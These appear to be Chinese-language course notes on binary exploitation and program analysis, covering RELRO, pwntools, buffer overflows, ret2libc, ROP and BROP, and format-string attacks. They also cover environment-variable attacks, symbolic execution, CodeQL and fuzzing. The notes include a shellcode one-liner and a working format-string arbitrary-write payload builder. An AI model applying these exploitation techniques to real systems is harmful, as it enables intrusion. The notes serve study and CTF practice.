<p>在仔细看这个地址，0x201d68 + 0x298 = 0x202000，在映射到内存的时候，<code>0x????-0x202000</code>被映射到了只读，而<code>0x202000-0x????</code>被映射到了读写。可以执行程序然后观察<code>/proc/pid/maps</code>来验证这一点。</p>
<blockquote>
<p>所以Linux是如何设置段的权限的呢？可能取最小的权限。等找到了相关的源代码再来分析。</p>
</blockquote>
<p><img src="Basic/Secure/Software/../images/image-20220412112248960.png" alt="image-20220412112248960" /></p>
<h2 id="partial-relro"><a class="header" href="#partial-relro">Partial RELRO</a></h2>
<p>Partial RELRO is the default setting in GCC, and nearly all binaries you will see have at least partial RELRO.</p>
<p>From an attackers point-of-view, partial RELRO makes almost no difference, other than it <strong>forces the GOT to come before the BSS in memory</strong>, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries.</p>
<p>观察一个Partial RELRO的ELF，<code>.got.plt</code>段被映射到了可写的segment。</p>
<p><img src="Basic/Secure/Software/../images/image-20220412110815542.png" alt="image-20220412110815542" /></p>
<h2 id="got-gotplt"><a class="header" href="#got-gotplt">.got, .got.plt</a></h2>
<p>GOT是Global Offset Table的缩写。但是我们在分析二进制程序的时候，经常会看见<code>.got</code>和<code>.got.plt</code>，他们都是数据段。</p>
<p><code>.got</code>总是被映射到只读的segment，也就是不需要lazy binding。<code>.got.plt</code>总是被映射到可读写的segment，意味着他需要lazy binding。所以说当我们使用Full RELRO的时候，我们就发现程序没有<code>.got.plt</code>段了</p>
<blockquote>
<p>lazy binding指的是在运行时填充GOT表的行为。避免了大程序在启动时一口气加载很多符号导致启动缓慢的问题。这意味着GOT表需要可写。</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pwntools"><a class="header" href="#pwntools">pwntools</a></h1>
<p><a href="https://docs.pwntools.com/en/stable/index.html"><code>pwntools</code></a>是一个Python的CTF PWN题工具套装，非常的好用。虽然说<code>from xx import *</code>是一个不被推荐的Python写法，但是在用pwntools编写exploit的时候，我们经常使用这种方法。他导入了什么在文档中有<a href="https://docs.pwntools.com/en/stable/globals.html">简单的介绍</a>。</p>
<pre><code class="language-python">from pwn import *
</code></pre>
<p>如果你有洁癖，也可以<code>import pwnlib.xxx</code>，比如下面的例子，来单独的导入某个模块。可以但没必要</p>
<pre><code class="language-python">import pwnlib.asm
</code></pre>
<p>下面介绍一些默认导入的常用的模块，就是说<code>import *</code>之后就可以使用了。</p>
<ul>
<li>
<p><a href="https://docs.pwntools.com/en/stable/elf/elf.html#module-pwnlib.elf.elf"><code>pwnlib.elf.elf</code></a>帮助我们分析一个ELF文件。打开一个ELF文件<code>ELF</code></p>
<pre><code class="language-python">&gt;&gt;&gt; elf = ELF(which(&quot;ls&quot;))
[*] '/usr/bin/ls'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre>
<p>然后就可以查看文件信息，比如<code>got</code>表，全局变量地址，函数信息</p>
<pre><code class="language-python">&gt;&gt;&gt; elf.got[&quot;error&quot;]
143136
&gt;&gt;&gt; elf.symbols[&quot;decoding_table&quot;]
2105776
&gt;&gt;&gt; elf.functions[&quot;main&quot;]
Function(name='main', address=0xf69, size=0xe2, elf=ELF('/home/reticence/windows/Users/Reticence/Desktop/SoftwareSec/lab3/echob'))
</code></pre>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/tubes.html#module-pwnlib.tubes"><code>pwnlib.tubes</code></a> 提供了一些联网的接口， 简单的用法就像下面这样，也有SSL支持和本地管道支持。</p>
<pre><code class="language-python">conn = remote(&quot;10.214.160.19&quot;, 30001)   #创建远程连接
conn = process(&quot;./echo&quot;)                #创建本地连接
conn.send(data)                         #发送数据，还有很多同类的函数
conn.recv(numb,timeout)                 #接受数据，还有很多同类的函数
</code></pre>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/asm.html#module-pwnlib.asm"><code>pwnlib.asm</code></a> 顾名思义，可以汇编和反汇编代码。利用他可以简单的写shellcode</p>
<pre><code class="language-python">&gt;&gt;&gt; asm(&quot;mov eax, 0&quot;)
b'\xb8\x00\x00\x00\x00'
&gt;&gt;&gt; disasm(b'\xb8\x0b\x00\x00\x00')
'   0:   b8 0b 00 00 00          mov    eax, 0xb'
&gt;&gt;&gt; shellcode = asm(shellcraft.sh())
</code></pre>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/context.html#module-pwnlib.context"><code>pwnlib.context</code></a> 里面存储了一些常量，通过他进行一些配置。</p>
<pre><code class="language-python">context.log_level = 'DEBUG'         # 日志等级
context.os = &quot;linux&quot;                # 操作系统
context.arch = &quot;i386&quot;               # 硬件架构
context.bits = 32                   # 架构位数
context.terminal = [&quot;tilix&quot;, &quot;-e&quot;]  # 如果要连接gdb可以配置terminal
</code></pre>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/rop/rop.html#module-pwnlib.rop.rop"><code>pwnlib.rop.rop</code></a> 可以帮助我们分析程序可用于Return Orient Programming的的gadget。</p>
<pre><code class="language-python">&gt;&gt;&gt; elf = ELF(&quot;./libc-2.31.so&quot;)
&gt;&gt;&gt; rop = ROP(elf)
[*] Loaded 201 cached gadgets for './libc-2.31.so'
&gt;&gt;&gt; rop.rdi
Gadget(0x26b72, ['pop rdi', 'ret'], ['rdi'], 0x8)
&gt;&gt;&gt; rop.leave
Gadget(0x5aa48, ['leave', 'ret'], ['ebp', 'esp'], 0x2540be403)
</code></pre>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/shellcraft.html#module-pwnlib.shellcraft"><code>pwnlib.shellcraft</code></a> 一些现成的shell code。<code>shellcraft.sh()</code>可以简单的生成目标架构、系统的shellcode，在context里配置。</p>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/gdb.html#pwnlib.gdb.debug"><code>pwnlib.gdb.debug</code></a>和<a href="https://docs.pwntools.com/en/stable/gdb.html#pwnlib.gdb.attach"><code>pwnlib.gdb.attach</code></a> 帮助我们配合GDB。比如执行下面的命令（假设保存在exploit.py中），会在新的终端中打开gdb调试。有时，你可能会想根据gdb调试的结果，去动态的添加一些Python脚本，这个时候你可以使用<code>python -i exploit.py</code>。</p>
<pre><code class="language-python">from pwn import *
conn = process(&quot;./echo&quot;)
gdb.attach(conn)

conn.send(&quot;ls&quot;)
</code></pre>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/util/packing.html#module-pwnlib.util.packing"><code>pwnlib.util.packing</code></a> 里面有可以帮我们将int和bytes转换的工具函数，比如<code>u32</code>将4字节变成一个整数，<code>p32</code>将整数变成4字节。但是直接使用这些函数会通不过静态检查，（强迫症）可以在脚本里加上自定义的函数</p>
<pre><code class="language-python">u64 = make_unpacker(64, endian=&quot;little&quot;, sign=&quot;unsigned&quot;)
u16 = make_unpacker(16, endian=&quot;little&quot;, sign=&quot;unsigned&quot;)
p32 = make_packer(32, endian=&quot;little&quot;, sign=&quot;unsigned&quot;)
p64 = make_packer(64, endian=&quot;little&quot;, sign=&quot;unsigned&quot;)
</code></pre>
</li>
<li>
<p><a href="https://docs.pwntools.com/en/stable/util/proc.html#module-pwnlib.util.proc"><code>pwnlib.util.proc</code></a> 我们知道<code>/proc</code>目录下存着进程的很多信息，这个方便我们查找进程信息。</p>
</li>
<li>
<p><code>pwblib.log</code> 里面的<code>log</code>函数可以帮我们打印简单的日志，比如<code>log.info(&quot;hacked&quot;)</code>。</p>
</li>
<li>
<p><code>os</code>,<code>sys</code>,<code>time</code>,<code>re</code>,<code>random</code>,<code>requests</code> 库也被自动导入，比如你可能想设置环境变量</p>
<pre><code class="language-python">os.environ[&quot;LD_LIBRARY_PATH&quot;] = &quot;/path/to/libc&quot;
</code></pre>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="攻击软件安全"><a class="header" href="#攻击软件安全">攻击软件安全</a></h1>
<p>从对抗的视角审视软件。可利用的bug，就是漏洞，介绍一些常见的漏洞和利用方式。</p>
<h2 id="buffer-overflow"><a class="header" href="#buffer-overflow">Buffer Overflow</a></h2>
<p>x86-32的栈布局，其他的架构也是类似的。</p>
<img src="Basic/Secure/Software/../images/image-20220318183415439.png" alt="layout" style="zoom:50%;" />
<p>x86-32函数的最后的清理工作，A&amp;AT格式。</p>
<pre><code class="language-assembly">leave   ; mov %ebp, %esp 清空栈内容
        ; pop %ebp 恢复上一个函数的ebp
ret     ; pop %eip 跳转到返回地址
</code></pre>
<p>函数开头的工作</p>
<pre><code class="language-assembly">push %ebp        ; 保存上一个函数的ebp
mov  %esp, %ebp  ; 设置这个函数的ebp
</code></pre>
<p>一般有下面的利用办法：</p>
<ul>
<li>修改返回地址。</li>
<li>修改函数指针。</li>
<li>修改局部变量，这样就不用改变正常的控制流。这依赖于程序的逻辑。</li>
<li>修改堆上数据。</li>
</ul>
<h3 id="canary"><a class="header" href="#canary">canary</a></h3>
<p>在old ebp和ret addr之间放置一个canary。这样在栈溢出的时候首先会覆盖canary然后才能覆盖ret addr。编译器会插入在返回前检查canary的代码。</p>
<p>虽然canary是一个运行时产生的值，但是是有可能通过其他的方式泄露出来的。并且<strong>在同一个进程中</strong>不同栈帧的canary都是相同的，并且fork()出的子进程和父进程的canary也相同，因为fork是完全的拷贝。</p>
<p>一般来说canary为<code>0x00 ?? ?? ??</code> (32 bits)</p>
<h3 id="depnx"><a class="header" href="#depnx">DEP(NX)</a></h3>
<p>冯诺依曼架构不区分数据和代码。为了解决这个问题，硬件支持了NX bit，让一个虚拟地址对应的页表项，要么可写W，要么可执行X。这样就可以把栈标记成不可执行。</p>
<p>NX可以完全防止code-injection attack，所以现在<strong>code-injection attack已经过时</strong>了。这样攻击者就只能<strong>重用代码</strong>，code-reuse attack。比如，就可以利用libc中的代码。这就是ret2libc。</p>
<h2 id="ret2libc"><a class="header" href="#ret2libc">Ret2libc</a></h2>
<p>libc中的一些函数特别好用。e.g. <code>execve(&quot;/bin/sh&quot;)</code>, <a href="https://man7.org/linux/man-pages/man3/system.3.html"><code>system(&quot;/bin/sh&quot;)</code></a>。怎么利用呢？三个步骤：</p>
<ol>
<li>find the address of the <code>system</code> function  （或者其他的函数）</li>
<li>find the string <code>&quot;bin/sh&quot;</code> （或者其他的命令）</li>
<li>pass <code>&quot;/bin/sh&quot;</code> to <code>system</code> function</li>
</ol>
<h3 id="怎么找字符串"><a class="header" href="#怎么找字符串">怎么找字符串</a></h3>
<ol>
<li>可以通过环境变量。libc中有一个全局变量<code>environ</code>，通常他会有<code>&quot;SHELL=/bin/bash&quot;</code>这样的或类似的环境变量。<code>environ</code>是一个字符数组指针，即<code>char **</code>，但是你不知道SHELL=/bin/bash在哪一个。</li>
<li>事实上，libc中就有<code>&quot;/bin/sh&quot;</code>字符串。</li>
</ol>
<h3 id="怎么传递参数"><a class="header" href="#怎么传递参数">怎么传递参数</a></h3>
<p>需要根据函数调用约定，给栈/寄存器做好布局。</p>
<h3 id="找到libc函数地址-with-aslr-without-pie"><a class="header" href="#找到libc函数地址-with-aslr-without-pie">找到libc函数地址 with <a href="Basic/Secure/Software/./ASLR.html">ASLR</a> without PIE</a></h3>
<p>怎么找libc中函数的地址呢？<strong>通过plt和got</strong>。</p>
<p>plt和got是什么？简单的认为plt是一段<strong>代码</strong>，用函数指针去调用真正的函数地址，got是一堆<strong>数据</strong>，就是一堆函数指针。plt call got。关于他们的具体细节，可以参考<a href="Basic/Secure/Software/../LinuxProgram/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html">动态链接</a>这篇文章。</p>
<p><strong>假设程序没有PIE</strong>，那么程序本身的加载地址是不变的。所以plt和got表的地址也是不变的。那么就可以想办法<strong>把got表的某项</strong>输出出来，就是<strong>libc的某个函数</strong>的地址。</p>
<p>如果你能知道<strong>libc的版本</strong>，你就知道libc的整个布局，那就可以算出你要找的别的字符串/函数的地址。有一些<a href="https://github.com/niklasb/libc-database">在线工具</a>可以帮你做这个事情。</p>
<p>e.g. 通过栈溢出，分别修改两次栈布局：第一次将返回地址改成<code>puts()</code>（准确的说是plt中的puts entry），参数改成got表地址，puts的返回地址改成<code>main</code>，这样就可以泄露libc的地址；第二次将返回地址改成libc中的<code>system()</code>，参数改成<code>&quot;/bin/sh&quot;</code>。如下图。</p>
<img src="Basic/Secure/Software/../images/image-20220318200147806.png" alt="image-20220318200147806" style="zoom:50%;" />
<h2 id="rop-code-reuse"><a class="header" href="#rop-code-reuse">ROP code reuse</a></h2>
<p>ROP = Return Orient Programming</p>
<p>ret2libc其实是一种特殊的ROP。ROP其实可以返回到任何<strong>以ret指令结尾的指令序列(gadget)</strong>，ret2libc其实是返回到了函数开头。而且在x86这种不定长指令的架构上，ROP还可以返回到一条指令的中间，这时CPU会将接下来的指令解码成其他的指令。</p>
<p>ROP的基本思路是，通过构造栈的布局，让栈上分布<strong>一系列返回地址</strong>。返回的时候先到第一个gadget，第一个gadget返回之后又跳到第二个gadget。比如下面这个例子，三个gadget就是一个store指令。你可以利用这些小片段，形成你的&quot;ROP虚拟机&quot;，如果你的小片段足够多，是可以图灵完全的。另外，除了源程序，libc中也有很多的ROP gadget可以使用。</p>
<p><img src="Basic/Secure/Software/../images/image-20220325185813053.png" alt="gadget example" /></p>
<p>一种利用code reuse的利用方式，是通过code reuse调用libc中的<code>mprotect</code>函数，用它关掉DEP，再进行code injection。</p>
<ul>
<li>防御ROP的一种方式叫做CFI(Control Flow Integrity)。基本思路就是校验控制流，检测非法的控制流。在每一条ret指令之前校验。</li>
<li>另一种方式是做随机化。可以随机化堆、栈、代码，可以在运行时做、编译时做。</li>
</ul>
<h2 id="brop"><a class="header" href="#brop">BROP</a></h2>
<p>Blind RO, 是在没有source code/binary的情况下做ROP。我们的基本思路是，leak binary，然后当做普通的ROP去做。假设我们和目标程序远程通过socket通信，所以下面的<code>崩溃=连接断开=从socket中读取到EOF</code>。</p>
<p>下面做的假设包括：能看到puts的结果（标准输出，或者可以用其他的方式获取信息例如Socket）；no-pie，每次崩溃之后内存布局不变（针对通过fork来应对请求的架构）；当然还要有缓冲区溢出漏洞。这些条件如果不满足需要通过其他的方法替换。</p>
<p>Leak the binary from the remote server:</p>
<ol>
<li>
<p>Find the offset to overwrite the return address: 如果没有canary并假设有Buffer Overflow，我们不停的增加输入数据的长度直到程序崩溃（覆盖的返回地址非法，就会崩溃，我们覆盖到栈上返回地址时，程序<strong>大概率会崩溃</strong>），这时我们就找到了return address的地方。</p>
<ul>
<li>What if we have stack canary? 那还需要先猜(试)出canary</li>
</ul>
</li>
<li>
<p>Find the <strong>stop gadget</strong>：找一个<strong>覆盖后不会崩溃的返回地址</strong>，只能一个一个试过来。（stop gadget就是指一段不会崩溃的代码片段，大多数返回地址都会导致崩溃）。</p>
</li>
<li>
<p>Find the BROP gadget：指的是下面一段代码，他是x86_64常见的代码片段。这个片段要怎么找呢？构造<code>返回地址?-空出6个位置-stop gadget地址</code>，然后不断的一个一个试返回地址，如果不崩溃，那么<strong>大概率</strong>找到了。（基于假设x86汇编中这一段代码常见，而且一般来说连续的6个pop只有这样的）</p>
<pre><code class="language-assembly">5b      pop    %rbx
5d      pop    %rbp
41 5c   pop    %r12
41 5d   pop    %r13
41 5e   pop    %r14
41 5f   pop    %r15
c3      retq   
</code></pre>
<p>这个片段的特殊之处在于，他中间包含了其他的常用gadget。最后两个/四个字节可以分别构成下面的gadget。可以控制函数的前两个参数。</p>
<pre><code class="language-assembly">5f     pop    %rdi # 第一个参数
c3     retq

5e     pop    %rsi # 第二个参数
41 5f  pop    %r15
c3     retq   
</code></pre>
<blockquote>
<p>System V AMD64 ABI(Linux使用) 的前六个整型或指针参数依次存储在 RDI, RSI, RDX, RCX, R8, R9</p>
</blockquote>
</li>
<li>
<p>Find the puts plt address:（注意这里要求程序<strong>没有开启PIE</strong>，没有开启PIE的程序装载的起始地址一般为0x400000，开启之后可能会装载在任意地址。）。</p>
<p>这时我们构造栈结构为 <code>brop gadget的后2字节-0x400000-puts?-stop gadget</code>。然后不断的试puts的地址，如果我们发现输出的开头为<code>ELF</code>那么说明我们找到了puts的地址。</p>
</li>
<li>
<p>Dump the binary: 然后不断的puts，注意puts遇到<code>\x00</code>就会停止输出。所以我们发现输出结束就知道下一个字节为0。然后不断的更改puts的参数，就可以把整个程序dump出来。</p>
</li>
</ol>
<h2 id="format-string"><a class="header" href="#format-string">Format String</a></h2>
<pre><code class="language-c">int printf(const char *format, ...);
int fprintf(FILE *stream, const char *format, ...);
int sprintf(char *str, const char *format, ...);
int snprintf(char *str, size_t size, const char *format, ...);
</code></pre>
<p>format的格式：<code>%[parameter][flags][field width][.precision][length]type</code>。下面是一些利用Bug需要的内容。</p>
<div class="table-wrapper"><table><thead><tr><th>Parameter</th><th>Meaning</th></tr></thead><tbody>
<tr><td>parameter = n$</td><td>n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。</td></tr>
<tr><td>field width</td><td>给出显示数值的最小宽度，<strong>利用他构造确定个数字符的输出</strong></td></tr>
<tr><td>type = x</td><td>16进制<code>unsigned int</code>。'<code>x</code>'使用小写字母；'<code>X</code>'使用大写字母。<strong>利用他来消耗栈上参数</strong></td></tr>
<tr><td>type = s</td><td>输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。</td></tr>
<tr><td>type = n</td><td>输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。<strong>利用它完成任意写</strong></td></tr>
<tr><td>type = c</td><td>输出字符类型</td></tr>
<tr><td>length = hh</td><td>对于整数类型，<code>printf</code>期待一个从<code>char</code>提升的<code>int</code>尺寸的整型参数。</td></tr>
<tr><td>length = h</td><td>对于整数类型，<code>printf</code>期待一个从<code>short</code>提升的<code>int</code>尺寸的整型参数。</td></tr>
</tbody></table>
</div>
<blockquote>
<p>C语言参数入栈顺序是从右往左压栈，这让实现可变参数比较简单。第一个参数的位置是固定的，在栈的返回地址上面。然后就可以根据第一个参数的内容指示的参数，不断的读取栈的其他参数。</p>
<p>如果是64位，系统调用参数的传递方式改成使用64位寄存器进行传递，依次为<strong>rdi, rsi, rdx, r10, r8, r9</strong>。调用号放在<strong>rax</strong>。函数的参数传递方式<strong>rdi, rsi, rdx, rcx, r8, r9</strong>，多于6个用栈传递。</p>
</blockquote>
<p>如果你可以控制<code>format</code>参数，就可以发起Format String攻击。他可以<strong>对memory做任意的<code>read</code>和<code>write</code></strong>，这个漏洞的品相很好。</p>
<p>一般来说，利用方式有：</p>
<ol>
<li>把程序中某函数的GOT地址传进去，然后获得该地址所对应的函数的虚拟地址。（注意，如果没有开启PIE那么GOT的地址是固定的，但是GOT的内容可能是lazy binding的，需要函数执行一次之后GOT表才是函数的虚拟地址）然后根据函数在 libc 中的相对位置，计算出我们需要的函数地址（如 <code>system()</code>）。</li>
<li>读写全局的函数指针</li>
<li>读写虚表指针（C++）</li>
</ol>
<h3 id="任意读"><a class="header" href="#任意读">任意读</a></h3>
<p><code>%08x,%08x,%08x,%08x</code>不停的往上读栈的内容。<code>AAAA%08x,%08x,%08x,%08x</code>不停的往上读栈的内容，并且发现读到了<code>41414141</code>，可以计算出我们字符串buffer的开头是第几个参数的位置。</p>
<p><code>pointer+%s</code>，读特定地址的内容</p>
<h3 id="任意写"><a class="header" href="#任意写">任意写</a></h3>
<p>例如，我现在想要写0x12345678这个地址（4字节）上的内容。修改成0x11AA88FF。</p>
<pre><code>\x78\x56\x34\x12 // 地址最好按照要写的数据大小，从小到大排序，否则用后面n$来规定
\x79\x56\x34\x12
\x7A\x56\x34\x12
\x7B\x56\x34\x12
%1${0x11}c %{x+3}$hhn  // 这里的x要计算，算format在栈上的位置
%1${0x88-0x11}c %{x+1}hhn
%1${0xAA-0x88}c %{x+2}hhn
%1${0xff-0xAA}c %{x+3}hhn
</code></pre>
<p>可以看一下下面这个任意写payload的构造</p>
<pre><code class="language-python">def any_write_bytes(n: int, ptr_data: Dict[int, bytes]) -&gt; bytes:
    &quot;&quot;&quot;
    Args:
        n (int): 可以控制的buffer的开头是printf的第几个参数
        ptr_data (Dict[int, bytes]): *(char*) ptr = (char) data

    Returns:
        bytes: payload
    &quot;&quot;&quot;

    l = []
    for p in ptr_data:
        l.append((int(ptr_data[p]), p))
    l.sort()

    payload = b&quot;&quot;

    for i in range(0, len(l)):
        if i == 0:
            # assert l[i][0] &gt; 4 * len(l)
            payload += &quot;%1${:04}c%{:03}$hhn&quot;.format(
                l[i][0], n + i + len(l) * 4
            ).encode()
        else:
            payload += &quot;%1${:04}c%{:03}$hhn&quot;.format(
                l[i][0] - l[i - 1][0], n + i + len(l) * 4
            ).encode()

    for i in range(0, len(l)):
        payload += p32(l[i][1])

    return payload
</code></pre>
<h2 id="integer-overflow"><a class="header" href="#integer-overflow">Integer Overflow</a></h2>
<p>整数溢出本身是很好理解的，不过要分成有符号溢出和无符号溢出。整数溢出是普遍的，别的语言可能不会有栈溢出，但是几乎所有语言都会有整数溢出。</p>
<p>尤其是当一个变量指示的意思是size/index的时候，如果溢出了，就可能会产生严重的问题。当然还有很多其他的问题也会因为整数溢出漏洞产生。</p>
<p>在下面这个例子中，如果输出的参数太长了，导致<strong>整数溢出</strong>，那么就会导致<strong>堆溢出</strong>。</p>
<pre><code class="language-c">int main(int argc, char* const *argv) {
    unsigned short int total;
    total = strlen(argv[1]) + strlen(argv[2]) + 1;
    char * buff = (char *) malloc(total);
    strcpy(buff,argv[1]);
    strcat(buff,argv[2]);
}
</code></pre>
<p>还有一个问题，就是如果我们用<code>int</code>等有符号数，作为数组的index的时候，当符号数是负数的时候，就可能会访问到一些奇怪的东西。</p>
<h2 id="heap-overflow"><a class="header" href="#heap-overflow">Heap Overflow</a></h2>
<p>有时你可以覆盖堆上Metadata完成漏洞利用，有时可以覆盖堆上的普通数据（比如，一个函数指针，覆盖了他劫持控制流）完成漏洞利用。</p>
<p>如果一个内存区域已经被Free了，而后续又被使用。被Free的指针又叫做悬挂指针。而悬挂指针，可能指向的是后续又分配出来的内存。在一个复杂的工程中，指针可能有下面的使用模式。所以Use After Free很难静态的检测出来。我想起了Scala的贷出模式和Rust的所有权模型。</p>
<ul>
<li>Alloc in one function</li>
<li>Free in another function</li>
<li>Use in a third function</li>
</ul>
<p>如果对一个指针Free两次，也会发生未定义的事情。可能会把Metadata搞乱。Linux中在释放内存使用了大量的goto技巧，用来错误处理时释放恰当的资源。</p>
<h2 id="环境变量攻击"><a class="header" href="#环境变量攻击">环境变量攻击</a></h2>
<p>环境变量可以看作是<code>Map&lt;String,String&gt;</code>，是字符串到字符串的映射。在C语言中，我们可以用environ这个全局变量来找到环境变量，他是在libc中维护的；或者使用main函数的参数envp来找到环境变量。</p>
<pre><code class="language-c">extern char** environ;
void main(int argc, char*argv[], char* envp) {
    // print something like &quot;SHELL=/bin/bash&quot;
    printf(&quot;%s\n&quot;,envp[0]); 
}
</code></pre>
<p>不过他们不完全一样：envp在程序运行之后就不会再变化；而environ是可以变的，可以认为environ始终执行最新的环境变量。</p>
<p>当我们追本溯源，环境变量是系统调用<code>execve(const char*filename, char* argv[], char* envp[])</code>的第三个参数。</p>
<p>有一个和environment variable很相似的东西，叫做shell variable，shell variable是Shell程序本身维护的。他们存在着继承的关系，详见下图</p>
<p><img src="Basic/Secure/Software/../images/image-20220415190537874.png" alt="image-20220415190537874" /></p>
<p>&quot;LD_PRELOAD&quot;: 当我们执行一个程序，里面有函数需要外部链接的时候，链接器会<strong>先</strong>找到LD_PRELOAD指定的外部动态库里面有没有需要的函数。比如，下面的例子</p>
<pre><code class="language-c">// sleep.c ===============================
// gcc -shared -o mylib.so sleep.c
#include &lt;stdio.h&gt;

int sleep() {
        printf(&quot;I'm not sleep\n&quot;);
        return 0;
}

// test.c ==================
// gcc test.c
#include &lt;unistd.h&gt;
int main() {
    sleep(1);
    return 0;
}

// ==========================
$ export LD_PRELOAD=./mylib.so
$ ./a.out
I'm not sleep
    
// setuid LD_PRELOAD失效 ==========
$ sudo chown root ./a.out
$ sudo chmod +s ./a.out
$ ./a.out
</code></pre>
<p>这个技术，可以用于sandbox，比如自己实现一套带额外检查的关键库函数，比如<code>open</code>。当然，这个并不是一个完备的方法，比如恶意程序可以不通过libc里面的函数去做<code>open</code>，而是自己直接用system call去做。这个时候我们还需要做额外的检查。</p>
<p>不过，如果程序的Set-UID被设置了，那么LD_PRELOAD就会被忽略。否则会产生严重的安全隐患。准确的说，Ld-linux.so will ignore LD_PRELOAD if real UID is different from effective UID。</p>
<p>Leak fd: 因为文件的权限检查发生在<code>open</code>系统调用，而不会发送在<code>write</code>/<code>read</code>，所以如果父进程在fork子进程的时候有一些文件没有close，子进程就会获得这些文件的<code>fd</code>，这时即使子进程本身没有读写这些文件的权限，也照样可以读写这些文件。（尤其是父进程有root权限，非常危险）</p>
<p>&quot;PATH&quot;是另一个很容易受到攻击的环境变量，如果能控制PATH，那么程序执行一些外部程序就会很危险。</p>
<p>总之，如果一个有特权的程序的执行会受环境变量的影响，那么就可以对环境变量进行攻击，从而获得高权限。</p>
<hr />
<div style="break-before: page; page-break-before: always;"></div><h1 id="程序分析"><a class="header" href="#程序分析">程序分析</a></h1>
<p>这里着重对程序的安全性进行分析。一般有两种方式</p>
<ul>
<li>动态检测：在程序运行时去检测。优点是不会误报，缺点是可能漏报并引入额外开销。一般来说，工业界不能容忍超过5%的额外开销。</li>
<li>静态分析：在程序运行前去检测，一般就是说编译时。缺点是误报率高。</li>
</ul>
<p>这里只讲基本的方法和工具，没有涉及后面的理论。以后有时间再去学习。</p>
<h2 id="静态分析"><a class="header" href="#静态分析">静态分析</a></h2>
<h3 id="control-flow-analysis"><a class="header" href="#control-flow-analysis">Control flow analysis</a></h3>
<p>在进行控制流分析的时候，我们通常要构建 CFG(control flow graph), Call graph 和 Control dependency。CFG一般指的是函数内的控制流图，Call graph指的是函数间的控制流图。</p>
<p>在之前LLVM的学习中我们了解过Basic Block的概念，是一串连续执行的指令，从第一条指令进入Basic Block (<strong>entry point</strong>)，并且在最后一条指令离开Basic Block (<strong>exit point</strong>)，在内部是没有分支的，Function是由Basic Block组成的。不过Basic Block不一定限于汇编指令，源代码层面Basic Block的概念也是类似的。<strong>Basic Block 就是CFG的节点</strong>。</p>
<p>所以CFG的边是什么呢？关注exit point，如果是unconditional branch，那就是一条边；如果是Conditional branch，那就是两条边。这是比较简单的情况。但是如果是通过寄存器的间接跳转呢，比如被编译成跳转表的switch怎么办呢？这是比较复杂的情况。</p>
<p><strong>Dominator(n)</strong>: 对于节点n，从入口节点出发要到达节点n必须通过的节点d的<strong>集合</strong>称为Dominator。我们称为d dom n。ImmediateDominator(n) 是Dominator(n)中离n最近的一个<strong>节点</strong>。下面是一个例子，①是入口节点。</p>
<p><img src="Basic/Secure/Software/../images/image-20220422191820283.png" alt="image-20220422191820283" /></p>
<p>Call graph是函数间的调用关系图。类似的，如果都是通过<code>foo(x)</code>这样的调用那么会很好分析，可是如果是通过例如C中的函数指针，C++的virtual table，或者是一些高级语言中的函数闭包，就很难分析。</p>
<ul>
<li>Flow Sensitivity</li>
<li>Context Sensitivity</li>
<li>Path Sensitivity</li>
</ul>
<h3 id="symbolicconcolic-execution"><a class="header" href="#symbolicconcolic-execution">Symbolic/Concolic Execution</a></h3>
<p>比如下面这个测试程序。我们对a/b/c的各种值进行测试，也可能会有遗漏，因为空间太大了。但是我们可以给他们赋予符号，然后计算<strong>路径和对应符号应该满足的条件</strong>，这比具体的Test Case能覆盖更多的可能。</p>
<p>我们可以根据符号条件求解去写具体的Test Case，去找到不可能被执行的分支，去找BUG。</p>
<p><img src="Basic/Secure/Software/../images/image-20220422194955218.png" alt="image-20220422194955218" /></p>
<p>KLEE是一个符号执行的工具，利用LLVM。</p>
<p>符号执行的挑战有路径爆炸（当程序复杂之后，路径会成指数型增长，还可能会无限递归），需要和环境进行交互（比如进行系统调用，调用libc）</p>
<h3 id="taint-analysis-污点分析"><a class="header" href="#taint-analysis-污点分析">Taint analysis (污点分析)</a></h3>
<p>污点分析是一种跟踪并分析污点信息在程序中流动的技术。在漏洞分析中，使用污点分析技术将所感兴趣的数据（通常来自程序的外部输入）标记为污点数据，然后通过跟踪和污点数据相关的信息的流向，可以知道它们是否会影响某些关键的程序操作，进而挖掘程序漏洞。</p>
<h3 id="codeql-1"><a class="header" href="#codeql-1">CodeQL</a></h3>
<p>是Github开发的一个很强大的静态分析工具。他可以分析源码的信息生成一个数据库，我们可以编写Code QL查询脚本对数据库进行查询，分析程序的问题。可以用于数据流分析，控制流分析，污点分析等。</p>
<p><img src="Basic/Secure/Software/../images/image-20220606153838068.png" alt="image-20220606153838068" /></p>
<h2 id="动态分析"><a class="header" href="#动态分析">动态分析</a></h2>
<h3 id="fuzzing"><a class="header" href="#fuzzing">fuzzing</a></h3>
<p>Fuzzing的基本思想就是随机产生一些输入给程序。</p>
<p><img src="Basic/Secure/Software/../images/image-20220429190227362.png" alt="image-20220429190227362" /></p>
<ul>
<li>
<p>How do we inject inputs? </p>
</li>
<li>
<p>How do we generate inputs? </p>
<p>coverage-guided, mutation</p>
</li>
<li>
<p>How do we automate the process?</p>
<p>libFuzz, <a href="https://aflplus.plus/">AFL++</a>,</p>
</li>
<li>
<p>How do we execute the program?</p>
</li>
<li>
<p>How do we detect bugs? </p>
<p>我们用特定的Sanitizers编译程序，让程序在遇到一些异常情况的时候崩溃。</p>
</li>
</ul>
<p>LLVM编译的时候可以给程序添加sanitizers，让程序在出现异常行为的时候直接崩溃。通过Sanitizer，我们还可以发现程序中的bug。</p>
<ul>
